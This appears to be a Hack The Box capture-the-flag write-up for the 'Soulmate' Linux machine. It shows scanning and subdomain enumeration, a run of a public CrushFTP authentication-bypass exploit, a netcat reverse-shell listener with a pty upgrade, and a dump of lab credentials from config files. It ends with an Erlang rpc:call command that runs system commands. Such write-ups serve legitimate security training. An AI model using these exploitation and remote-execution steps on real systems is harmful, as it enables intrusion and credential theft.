# [Soulamte] - [HTB]
**Difficulty:** [Easy]  
**OS:** [Linux]  
**Date:** [09/09/2025]  
---

## 1. Summary
- **Objective:** [ ] Capture user flag  
- **Objective:** [ ] Capture root flag / administrator access  
- **Description / Notes:** [Brief overview of the machine, main services, challenges]  
- **Skills Practiced:** 
  - [ ] Enumeration
  - [ ] Web Exploitation
  - [ ] Privilege Escalation

---

## 2. Recon & Enumeration

### 2.1 Network Scanning
```bash
┌──(sabeshan㉿kali)-[~]
└─$ nmap -sS -A -sV -T4 10.10.11.86 -Pn -vv   
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-09 15:01 IST
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:01
Completed NSE at 15:01, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:01
Completed NSE at 15:01, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:01
Completed NSE at 15:01, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 15:01
Completed Parallel DNS resolution of 1 host. at 15:01, 0.03s elapsed
Initiating SYN Stealth Scan at 15:01
Scanning 10.10.11.86 [1000 ports]
Discovered open port 80/tcp on 10.10.11.86
Discovered open port 22/tcp on 10.10.11.86
Increasing send delay for 10.10.11.86 from 0 to 5 due to 367 out of 917 dropped probes since last increase.
Increasing send delay for 10.10.11.86 from 5 to 10 due to 11 out of 19 dropped probes since last increase.
Completed SYN Stealth Scan at 15:01, 8.96s elapsed (1000 total ports)
Initiating Service scan at 15:01
Scanning 2 services on 10.10.11.86
Completed Service scan at 15:01, 6.49s elapsed (2 services on 1 host)
Initiating OS detection (try #1) against 10.10.11.86
Retrying OS detection (try #2) against 10.10.11.86
WARNING: OS didn't match until try #2
Initiating Traceroute at 15:01
Completed Traceroute at 15:01, 0.22s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 15:01
Completed Parallel DNS resolution of 2 hosts. at 15:01, 6.55s elapsed
NSE: Script scanning 10.10.11.86.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:01
Completed NSE at 15:01, 5.40s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:01
Completed NSE at 15:01, 0.80s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:01
Completed NSE at 15:01, 0.01s elapsed
Nmap scan report for 10.10.11.86
Host is up, received user-set (0.20s latency).
Scanned at 2025-09-09 15:01:26 IST for 33s
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ+m7rYl1vRtnm789pH3IRhxI4CNCANVj+N5kovboNzcw9vHsBwvPX3KYA3cxGbKiA0VqbKRpOHnpsMuHEXEVJc=
|   256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtuEdoYxTohG80Bo6YCqSzUY9+qbnAFnhsk4yAZNqhM
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://soulmate.htb/
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=9/9%OT=22%CT=1%CU=36309%PV=Y%DS=2%DC=T%G=Y%TM=68BFF40F
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)SEQ(
OS:SP=F1%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M577ST11NW7%O2=M577ST11NW
OS:7%O3=M577NNT11NW7%O4=M577ST11NW7%O5=M577ST11NW7%O6=M577ST11)WIN(W1=FE88%
OS:W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M577N
OS:NSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=
OS:Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=A
OS:R%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%D
OS:F=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=4
OS:0%CD=S)

Uptime guess: 44.641 days (since Sat Jul 26 23:39:14 2025)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 110/tcp)
HOP RTT       ADDRESS
1   207.15 ms 10.10.14.1
2   207.05 ms 10.10.11.86

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:01
Completed NSE at 15:01, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:01
Completed NSE at 15:01, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:01
Completed NSE at 15:01, 0.00s elapsed
Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.01 seconds
           Raw packets sent: 1559 (70.312KB) | Rcvd: 1092 (53.898KB)
```
---
I used to enumerate the dirctory services but I couldn't obtained any but I tried subdomain enumeration i got a subdomain with vulnerable cms
```bash
┌──(sabeshan㉿kali)-[~]
└─$ ffuf -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://soulmate.htb/ -H "Host: FUZZ.soulmate.htb" -fw 4 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://soulmate.htb/
 :: Wordlist         : FUZZ: /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.soulmate.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 4
________________________________________________

ftp                     [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 254ms]
:: Progress: [4989/4989] :: Job [1/1] :: 205 req/sec :: Duration: [0:00:25] :: Errors: 0 ::
                                                                                                                                                 
┌──(sabeshan㉿kali)-[~]
└─$ searchsploit crushftp       
--------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                 |  Path
--------------------------------------------------------------------------------------------------------------- ---------------------------------
CrushFTP 11.3.1 - Authentication Bypass                                                                        | multiple/remote/52295.py
CrushFTP 7.2.0 - Multiple Vulnerabilities                                                                      | multiple/webapps/36126.txt
CrushFTP < 11.1.0 - Directory Traversal                                                                        | multiple/remote/52012.py
```
---
After I run the authentication bypass with this.

```bash
┌──(myenv)─(sabeshan㉿kali)-[~/HTB/soulmate]
└─$ python3 52295.py --target ftp.soulmate.htb/WebInterface/login.html --port 80 --exploit --new-user hacker --password P@ssw0rd 
 

[36m
  / ____/______  _______/ /_  / ____/ /_____
 / /   / ___/ / / / ___/ __ \/ /_  / __/ __ \
/ /___/ /  / /_/ (__  ) / / / __/ / /_/ /_/ /
\____/_/   \__,_/____/_/ /_/_/    \__/ .___/
                                    /_/
[32mCVE-2025-31161 Exploit 2.0.0[33m | [36m Developer @ibrahimsql
[0m

Exploiting 1 targets with 10 threads...
[+] Successfully created user hacker on ftp.soulmate.htb/WebInterface/login.html
Exploiting targets... ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% (1/1) 0:00:00

Exploitation complete! Successfully exploited 1/1 targets.

Exploited Targets:
→ ftp.soulmate.htb/WebInterface/login.html

Summary:
Total targets: 1
Vulnerable targets: 0
Exploited targets: 1
```
---
With this i tried to file upload and try to obatimed the reverse shell

<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/85f167c4-109d-4012-980d-50911e3a8bdc" />

---
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/269b8493-fc80-4afb-944f-53b4ada67f99" />

---
I generate a random password and log with these creds then i ccan easily upload the shell and gain the reverse shell
Username : ben Password : 7EkTgz
```bash
┌──(myenv)─(sabeshan㉿kali)-[~/HTB/soulmate]
└─$ nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.14.18] from (UNKNOWN) [10.10.11.86] 60210
Linux soulmate 5.15.0-153-generic #163-Ubuntu SMP Thu Aug 7 16:37:18 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
 07:47:41 up  1:10,  0 users,  load average: 0.01, 0.02, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (1104): Inappropriate ioctl for device
bash: no job control in this shell
www-data@soulmate:/$ python3 -c 'pty;pty.spawn("/bin/bash")'
python3 -c 'pty;pty.spawn("/bin/bash")'
Traceback (most recent call last):
  File "<string>", line 1, in <module>
NameError: name 'pty' is not defined
www-data@soulmate:/$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@soulmate:/$ ^Z
zsh: suspended  nc -lvnp 1337
                                                                                                                                                 
┌──(myenv)─(sabeshan㉿kali)-[~/HTB/soulmate]
└─$ stty raw -echo; fg                  
[1]  + continued  nc -lvnp 1337

www-data@soulmate:/$ ls -a
.   bin   dev  home  lib32  libx32      media  opt   root  sbin  sys  usr
..  boot  etc  lib   lib64  lost+found  mnt    proc  run   srv   tmp  var
www-data@soulmate:/$ cd /home
www-data@soulmate:/home$ ls
ben
www-data@soulmate:/home$ cd ben
bash: cd: ben: Permission denied
www-data@soulmate:/home$ ls -la
total 12
drwxr-xr-x  3 root root 4096 Sep  2 10:27 .
drwxr-xr-x 18 root root 4096 Sep  2 10:27 ..
drwxr-x---  3 ben  ben  4096 Sep  2 10:27 ben
www-data@soulmate:/home$ cd /var/www/
www-data@soulmate:~$ ls -la
total 16
drwxr-xr-x  4 root root 4096 Aug 27 09:24 .
drwxr-xr-x 13 root root 4096 Sep  2 10:19 ..
drwxr-xr-x  2 root root 4096 Aug 27 09:25 html
drwxr-xr-x  6 root root 4096 Aug 10 10:39 soulmate.htb
www-data@soulmate:~$ cd soulmate.htb/
www-data@soulmate:~/soulmate.htb$ ls -la
total 24
drwxr-xr-x 6 root     root     4096 Aug 10 10:39 .
drwxr-xr-x 4 root     root     4096 Aug 27 09:24 ..
drwxrwxr-x 2 www-data www-data 4096 Aug 19 11:01 config
drwxrwxr-x 2 www-data www-data 4096 Sep 11 07:39 data
drwxrwxr-x 3 www-data www-data 4096 Sep 11 07:47 public
drwxrwxr-x 3 www-data www-data 4096 Aug 10 07:06 src
www-data@soulmate:~/soulmate.htb$ cd config/
www-data@soulmate:~/soulmate.htb/config$ ls -la
total 12
drwxrwxr-x 2 www-data www-data 4096 Aug 19 11:01 .
drwxr-xr-x 6 root     root     4096 Aug 10 10:39 ..
-rw-r--r-- 1 www-data www-data 2420 Aug 19 11:01 config.php
www-data@soulmate:~/soulmate.htb/config$ cat config.php 
<?php
class Database {
    private $db_file = '../data/soulmate.db';
    private $pdo;

    public function __construct() {
        $this->connect();
        $this->createTables();
    }

    private function connect() {
        try {
            // Create data directory if it doesn't exist
            $dataDir = dirname($this->db_file);
            if (!is_dir($dataDir)) {
                mkdir($dataDir, 0755, true);
            }

            $this->pdo = new PDO('sqlite:' . $this->db_file);
            $this->pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
            $this->pdo->setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_ASSOC);
        } catch (PDOException $e) {
            die("Connection failed: " . $e->getMessage());
        }
    }

    private function createTables() {
        $sql = "
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT UNIQUE NOT NULL,
            password TEXT NOT NULL,
            is_admin INTEGER DEFAULT 0,
            name TEXT,
            bio TEXT,
            interests TEXT,
            phone TEXT,
            profile_pic TEXT,
            last_login DATETIME,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP
        )";

        $this->pdo->exec($sql);

        // Create default admin user if not exists
        $adminCheck = $this->pdo->prepare("SELECT COUNT(*) FROM users WHERE username = ?");
        $adminCheck->execute(['admin']);
        
        if ($adminCheck->fetchColumn() == 0) {
            $adminPassword = password_hash('Crush4dmin990', PASSWORD_DEFAULT);
            $adminInsert = $this->pdo->prepare("
                INSERT INTO users (username, password, is_admin, name) 
                VALUES (?, ?, 1, 'Administrator')
            ");
            $adminInsert->execute(['admin', $adminPassword]);
        }
    }

    public function getConnection() {
        return $this->pdo;
    }
}

// Helper functions
function redirect($path) {
    header("Location: $path");
    exit();
}

function isLoggedIn() {
    return isset($_SESSION['user_id']);
}

function isAdmin() {
    return isset($_SESSION['is_admin']) && $_SESSION['is_admin'] == 1;
}

function requireLogin() {
    if (!isLoggedIn()) {
        redirect('/login');
    }
}

function requireAdmin() {
    requireLogin();
    if (!isAdmin()) {
        redirect('/profile');
    }
}
?>
www-data@soulmate:~/soulmate.htb/config$ cd ../data
www-data@soulmate:~/soulmate.htb/data$ ls -la
total 24
drwxrwxr-x 2 www-data www-data  4096 Sep 11 07:39 .
drwxr-xr-x 6 root     root      4096 Aug 10 10:39 ..
-rw-rw-r-- 1 www-data www-data 16384 Sep 11 07:39 soulmate.db
www-data@soulmate:~/soulmate.htb/data$ 
www-data@soulmate:~/soulmate.htb/data$ sqlite3 soulmate.db  
SQLite version 3.37.2 2022-01-06 13:25:41
Enter ".help" for usage hints.
sqlite> .dump;
Error: unknown command or invalid arguments:  "dump;". Enter ".help" for help
sqlite> .dump
PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
CREATE TABLE users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT UNIQUE NOT NULL,
            password TEXT NOT NULL,
            is_admin INTEGER DEFAULT 0,
            name TEXT,
            bio TEXT,
            interests TEXT,
            phone TEXT,
            profile_pic TEXT,
            last_login DATETIME,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP
        );
INSERT INTO users VALUES(1,'admin','$2y$12$u0AC6fpQu0MJt7uJ80tM.Oh4lEmCMgvBs3PwNNZIR7lor05ING3v2',1,'Administrator',NULL,NULL,NULL,NULL,'2025-08-10 13:00:08','2025-08-10 12:59:39');
DELETE FROM sqlite_sequence;
INSERT INTO sqlite_sequence VALUES('users',2);
COMMIT;
```
---
<img width="1916" height="463" alt="image" src="https://github.com/user-attachments/assets/c2760da4-0035-4fad-8097-32d06c017089" />

---
```bash
www-data@soulmate:/var/log$ cat /usr/local/lib/erlang_login/start.escript
#!/usr/bin/env escript
%%! -sname ssh_runner

main(_) ->
    application:start(asn1),
    application:start(crypto),
    application:start(public_key),
    application:start(ssh),

    io:format("Starting SSH daemon with logging...~n"),

    case ssh:daemon(2222, [
        {ip, {127,0,0,1}},
        {system_dir, "/etc/ssh"},

        {user_dir_fun, fun(User) ->
            Dir = filename:join("/home", User),
            io:format("Resolving user_dir for ~p: ~s/.ssh~n", [User, Dir]),
            filename:join(Dir, ".ssh")
        end},

        {connectfun, fun(User, PeerAddr, Method) ->
            io:format("Auth success for user: ~p from ~p via ~p~n",
                      [User, PeerAddr, Method]),
            true
        end},

        {failfun, fun(User, PeerAddr, Reason) ->
            io:format("Auth failed for user: ~p from ~p, reason: ~p~n",
                      [User, PeerAddr, Reason]),
            true
        end},

        {auth_methods, "publickey,password"},

        {user_passwords, [{"ben", "HouseH0ldings998"}]},
        {idle_time, infinity},
        {max_channels, 10},
        {max_sessions, 10},
        {parallel_login, true}
    ]) of
        {ok, _Pid} ->
            io:format("SSH daemon running on port 2222. Press Ctrl+C to exit.~n");
        {error, Reason} ->
            io:format("Failed to start SSH daemon: ~p~n", [Reason])
    end,

    receive
        stop -> ok
    end.
```
---
```bash
ben@soulmate:~$ ss -tulnp
Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:PortProcess
udp   UNCONN 0      0      127.0.0.53%lo:53         0.0.0.0:*          
tcp   LISTEN 0      4096       127.0.0.1:4369       0.0.0.0:*          
tcp   LISTEN 0      5          127.0.0.1:2222       0.0.0.0:*          
tcp   LISTEN 0      4096       127.0.0.1:8443       0.0.0.0:*          
tcp   LISTEN 0      4096       127.0.0.1:9090       0.0.0.0:*          
tcp   LISTEN 0      511          0.0.0.0:80         0.0.0.0:*          
tcp   LISTEN 0      128          0.0.0.0:22         0.0.0.0:*          
tcp   LISTEN 0      4096       127.0.0.1:37557      0.0.0.0:*          
tcp   LISTEN 0      4096   127.0.0.53%lo:53         0.0.0.0:*          
tcp   LISTEN 0      4096       127.0.0.1:8080       0.0.0.0:*          
tcp   LISTEN 0      128        127.0.0.1:42741      0.0.0.0:*          
tcp   LISTEN 0      511             [::]:80            [::]:*          
tcp   LISTEN 0      128             [::]:22            [::]:*          
tcp   LISTEN 0      4096           [::1]:4369          [::]:*          
ben@soulmate:~$ 
```
---

127.0.0.1:2222 → possibly another SSH/management service.

127.0.0.1:8080 → common for web apps, dashboards, or Tomcat.

127.0.0.1:8443 → HTTPS admin panel (maybe Java app, Jenkins, etc.).

127.0.0.1:9090 → often used for monitoring (Prometheus, Webmin, etc.).

127.0.0.1:4369 → Erlang Port Mapper Daemon (epmd), part of RabbitMQ/Elixir

---
erl -name attacker@yourip -setcookie COOKIE using this command to exexute the commands
rpc:call('ben@10.10.11.86', os, cmd, ["id"])

